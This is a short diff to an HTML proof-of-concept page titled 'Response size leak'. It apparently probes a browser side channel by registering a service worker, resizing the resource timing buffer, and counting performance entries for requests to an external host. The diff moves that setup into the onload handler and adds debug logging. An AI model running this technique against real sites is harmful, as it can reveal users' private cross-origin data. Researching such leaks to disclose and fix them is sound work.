@@ -1,14 +1,7 @@
 <head>
   <title>Response size leak</title>
   <script>
-    if ('serviceWorker' in navigator) {
-      addEventListener('load', async () => {
-        performance.setResourceTimingBufferSize(1337);
-        const registration = await navigator.serviceWorker.register('static/serviceworker.js');
-        if (registration.installing)
-          location.reload();
-      });
-    }
+    
 
     async function get_diff(url, code, succeed) {
       let start = performance.getEntries().length;
@@ -34,6 +27,16 @@
     }
     
     onload = () => {
+      console.log('out');
+      if ('serviceWorker' in navigator) {
+        addEventListener('load', async () => {
+          performance.setResourceTimingBufferSize(1337);
+          const registration = await navigator.serviceWorker.register('static/serviceworker.js');
+          console.log('in');
+          if (registration.installing)
+            location.reload();
+        });
+      }
       run('http://georgetian.com:8880');
     }
   </script>
